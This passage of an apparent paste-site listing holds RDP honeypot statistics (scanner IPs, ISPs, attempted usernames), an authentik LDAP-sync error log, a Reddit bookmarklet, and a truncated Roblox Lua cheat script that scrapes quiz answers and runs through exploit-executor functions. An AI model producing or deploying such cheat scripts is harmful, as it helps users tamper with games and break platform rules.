    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8336,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8795,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8564,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9914
  },
  ""client_build"": {
    ""Unknown"": 9914
  },
  ""client_name"": {
    ""Unknown"": 9914
  },
  ""ip_type"": {
    ""hosting"": 8588,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
Swan7bZm,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8335,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8335,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8335,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8335,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8335,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8794,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8563,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9913
  },
  ""client_build"": {
    ""Unknown"": 9913
  },
  ""client_name"": {
    ""Unknown"": 9913
  },
  ""ip_type"": {
    ""hosting"": 8587,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
EHGFRtfQ,Untitled,AndrewBucklin,JSON,Friday 7th of July 2023 06:57:42 PM CDT,"[
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""373c696b-1af9-48c9-a4db-6e6b0eaf77db"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-07T23:48:25.582685""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""7578862d-f27c-45ef-8f98-014bbc65a1f3"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.594055""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.634574""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.636555""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.638471""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""state"": ""SUCCESS"",
    ""task_id"": ""7578862d-f27c-45ef-8f98-014bbc65a1f3"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.641141""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10335,
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.640837""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10335,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-ce2f6aca0b4a40f7a9d04038254479b1"",
    ""timestamp"": ""2023-07-07T23:48:25.732945""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10335,
    ""state"": ""SUCCESS"",
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.741521""
  },
  {
    ""event"": ""Task failure"",
    ""exc"": ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""level"": ""warning"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""task-373c696b1af948c9a4db6e6b0eaf77db"",
    ""timestamp"": ""2023-07-07T23:48:25.867896""
  },
  {
    ""action"": ""system_exception"",
    ""client_ip"": null,
    ""context"": {
      ""message"": ""Traceback (most recent call last):\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 477, in trace_task\n    R = retval = fun(*args, **kwargs)\n                 ^^^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 275, in _inner\n    reraise(*exc_info)\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/_compat.py\"", line 60, in reraise\n    raise value\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 270, in _inner\n    return f(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 760, in __protected_call__\n    return self.run(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 42, in ldap_sync_single\n    ldap_sync_paginator(source, UserLDAPSynchronizer)\n  File \""/authentik/sources/ldap/tasks.py\"", line 55, in ldap_sync_paginator\n    sync_inst: BaseLDAPSynchronizer = sync(source)\n                                      ^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/sync/base.py\"", line 29, in __init__\n    self._connection = source.connection()\n                       ^^^^^^^^^^^^^^^^^\nbuiltins.AttributeError: 'UUID' object has no attribute 'connection'""
    },
    ""event"": ""Created Event"",
    ""level"": ""info"",
    ""logger"": ""authentik.events.models"",
    ""pid"": 10334,
    ""timestamp"": ""2023-07-07T23:48:25.870133"",
    ""user"": {}
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""authentik.events.tasks.event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.912180""
  },
  {
    ""event"": ""Task authentik.sources.ldap.tasks.ldap_sync_single[373c696b-1af9-48c9-a4db-6e6b0eaf77db] raised unexpected: AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""exc_info"": [
      ""<class 'AttributeError'>"",
      ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
      ""<billiard.einfo.Traceback object at 0x7f7deba78190>""
    ],
    ""level"": ""error"",
    ""logger"": ""celery.app.trace"",
    ""timestamp"": 1688773705.9130294
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""state"": ""FAILURE"",
    ""task_id"": ""373c696b-1af9-48c9-a4db-6e6b0eaf77db"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-07T23:48:25.913260""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10339,
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:26.335855""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10339,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-98784d156a3c41edbb7fe84c1ad68c81"",
    ""timestamp"": ""2023-07-07T23:48:26.400083""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10339,
    ""state"": ""SUCCESS"",
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:26.408206""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.442961""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10342,
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.442958""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.495114""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.496959""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.498974""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""state"": ""SUCCESS"",
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.502737""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10343,
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.508156""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10342,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-61ea557561e441baa3f41234b8840cfd"",
    ""timestamp"": ""2023-07-07T23:48:27.515969""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10342,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-61ea557561e441baa3f41234b8840cfd"",
    ""timestamp"": ""2023-07-07T23:48:27.526643""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10342,
    ""state"": ""SUCCESS"",
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.532823""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10343,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-c0b5775423e4410a875a67b32aa8be9f"",
    ""timestamp"": ""2023-07-07T23:48:27.568338""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10343,
    ""state"": ""SUCCESS"",
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.574551""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10347,
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.575128""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10348,
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.575128""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10348,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-41292260c6dd4124a8bf22a7d764d5d5"",
    ""timestamp"": ""2023-07-07T23:48:28.650010""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10347,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-eea0b27b3cc64bbebd2540ff0ee625e3"",
    ""timestamp"": ""2023-07-07T23:48:28.650010""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10347,
    ""state"": ""SUCCESS"",
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.657057""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10348,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-41292260c6dd4124a8bf22a7d764d5d5"",
    ""timestamp"": ""2023-07-07T23:48:28.658633""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10348,
    ""state"": ""SUCCESS"",
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.665930""
  }
]"
gewFCb72,New Reddit to Old Reddit bookmarklet,v1s,JavaScript,Friday 7th of July 2023 06:51:44 PM CDT,"javascript:(function() { window.location.href = window.location.href.replace(/^https?:\/\/(www\.)?(.*)/i, 'https://old.$2'); })();"
fuWesciz,LONGEST ANSWER WINS GET ANSWERS!!! (NEW ANSWERS),2AreYouMental110,Lua,Friday 7th of July 2023 05:19:42 PM CDT,"-- this is not super reliable, as some answers are from the mobile game, not the roblox version
-- also you may need to open this link for it to work https://www.puzzlegamemaster.com/longest-answer-wins-roblox-answers/

local connectstuff = {}
print(""loading sources"")
local source1 = game:HttpGet(""https://tryhardguides.com/longest-answer-wins-roblox-answers/"")
print(""source loaded (1)"")
local source2 = game:HttpGet(""https://www.ggrecon.com/guides/roblox-longest-answer-wins-answers/"")
print(""source loaded (2)"")
local source3 = game:HttpGet(""https://www.puzzlegamemaster.com/longest-answer-wins-roblox-answers/"")
print(""source loaded (3)"")
-- decode into code!
local decodedsources = {}
local source
source = string.gsub(source3,""<[^>]*>"",""-"")
source = string.sub(source,string.find(source,""--Longest Answer--------"")+string.len(""--Longest Answer--------""),string.find(source,""Congratulations"")-5)
print(source)
local searchstring = ""%-""..""%-""..""%-""..""%-""
local searchstring2 = ""%-""..""%-""..""%-""..""%-""..""%-""..""%-""
local amounttofind = 0
for find in string.gmatch(source,searchstring) do
    amounttofind += 1
end

print(amounttofind)

for i = 1,amounttofind do
    local find = string.find(source,searchstring)
    if find then
        local question = string.sub(source,1,find-1)
        local questionpos = {1,find-1}
        local cutstr = string.sub(source,questionpos[2]+5)
        local answerpos = {1,string.find(cutstr,""%-"")-1}
        local answer = string.sub(cutstr,answerpos[1],answerpos[2])
        decodedsources[question] = answer
        source = string.sub(cutstr,answerpos[2]+7)
    end
end

for i,v in pairs(decodedsources) do
    print(i,v)
end

print(amounttofind)
-- extras
decodedsources[""sea animal""] = ""GREAT WHITE SHARK""
decodedsources[""letter l""] = ""LEOPARD""
decodedsources[""moves slowly""] = ""SLOTH""
decodedsources[""letter p""] = ""PETERSON""
decodedsources[""weapon""] = ""LONGSWORD""
decodedsources[""red vegetable""] = ""BEETROOT""
decodedsources[""furniture""] = ""BOOKCASE""
decodedsources[""firefighters""] = ""FIRE HYDRANT""
decodedsources[""outside of roblox""] = ""PLAYER UNKNOWNS BATTLEGROUNDS""
decodedsources[""draw with""] = ""COLOURED PENCIL""
decodedsources[""successful people buy""] = ""MANSION""
decodedsources[""outerspace""] = ""METEORITES""
decodedsources[""board game""] = ""MONOPOLY""
decodedsources[""superhero ability""] = ""TELEPORTATION""
decodedsources[""vitamin""] = ""VITAMIN A""
decodedsources[""cheese""] = ""SHREDDED CHEESE""
decodedsources[""lays eggs""] = ""CROCODILE""
decodedsources[""video game genre""] = ""FIGHTING""
decodedsources[""police""] = ""BULLET PROOF VEST""
decodedsources[""farm""] = ""CHICKEN""
decodedsources[""gym""] = ""BODYBUILDERS""
decodedsources[""use to cook food""] = ""KITCHEN KNIFE""
decodedsources[""3d shape""] = ""RECTANGULAR PRISM""
decodedsources[""measure""] = ""CENTIMETER""
decodedsources[""equipment""] = ""MICROPHONE""
decodedsources[""gardening tool""] = ""SHOVEL""
decodedsources[""antlers""] = ""AFRICAN BUFFALO""
decodedsources[""supervillain""] = ""MEGAMIND""
decodedsources[""face""] = ""EYELASHES""
decodedsources[""character""] = ""SONIC THE HEDGEHOG""
decodedsources[""disney main character""] = ""CINDERELLA""
decodedsources[""phone accessory""] = ""PHONE CASE""
decodedsources[""bathtub""] = ""RUBBER DUCKY""
decodedsources[""running""] = ""MARATHON""
decodedsources[""clothing""] = ""LONG SLEEVE SHIRT""
decodedsources[""beach""] = ""SAND CASTLES""
decodedsources[""grows""] = ""UNDER ARMS""
decodedsources[""with t""] = ""TAYLOR""
decodedsources[""part of a car""] = ""STEERING WHEEL""
decodedsources[""airport""] = ""AIRPLANE""
decodedsources[""place that you can swim""] = ""SWIMMING POOL""
decodedsources[""basketball player""] = ""MICHAEL JORDAN""
decodedsources[""household chore""] = ""CLEAN THE DISHES""
decodedsources[""tells the time""] = ""GRANDFATHER CLOCK""
decodedsources[""natural disaster""] = ""VOLCANIC ERUPTION""
decodedsources[""famous singer""] = ""MICHAEL JACKSON""
decodedsources[""strings on it""] = ""ELECTRIC GUITAR""
decodedsources[""tree type""] = ""BIRCH TREE""
decodedsources[""flower""] = ""DANDELION""
decodedsources[""japanese food""] = ""SUSHI""
decodedsources[""famous piece of art""] = ""THE STARRY NIGHT""
decodedsources[""farmer""] = ""TRACTOR""
decodedsources[""type of shoe""] = ""TENNIS SHOES""
decodedsources[""in a park""] = ""PLAYGROUND""
decodedsources[""park""] = ""PLAYGROUND""
decodedsources[""hair style""] = ""PONYTAIL""
decodedsources[""roblox youtuber""] = ""COOKIESWIRLC""
decodedsources[""youtuber""] = ""COOKIESWIRLC""
decodedsources[""class you would take in school""] = ""ENGLISH LANGUAGE ARTS""
decodedsources[""sports cars""] = ""MERCEDES BENZ""
decodedsources[""school bag""] = ""NOTEBOOK""
decodedsources[""workshop tool""] = ""HAMMER""
decodedsources[""usually cold""] = ""REFRIGERATOR""
decodedsources[""type of nut""] = ""MACADAMIA NUTS""
decodedsources[""edible meat""] = ""CHICKEN NUGGETS""
decodedsources[""outdoor games recess""] = ""AMERICAN FOOTBALL""
decodedsources[""hear in the city""] = ""SCREAMING""
decodedsources[""room in the house""] = ""MASTER BEDROOM""
decodedsources[""sport you like to play""] = ""AMERICAN FOOTBALL""

if not isfolder(""getstuff"") then
    makefolder(""getstuff"")
end


local gui = Instance.new(""ScreenGui"")
local mainframe = Instance.new(""Frame"")
local deletebutton = Instance.new(""TextButton"")
local questiontext = Instance.new(""TextBox"")
local answertext = Instance.new(""TextBox"")
local credits = Instance.new(""TextLabel"")

gui.Parent = game.CoreGui

mainframe.Position = UDim2.new(0.4,0,0.4)
mainframe.Size = UDim2.new(0.4,0,0.4,0)
mainframe.Active = true
mainframe.Draggable = true
mainframe.BackgroundColor3 = Color3.fromRGB(50,50,50)
mainframe.BorderColor3 = Color3.fromRGB(255,255,255)
mainframe.Parent = gui

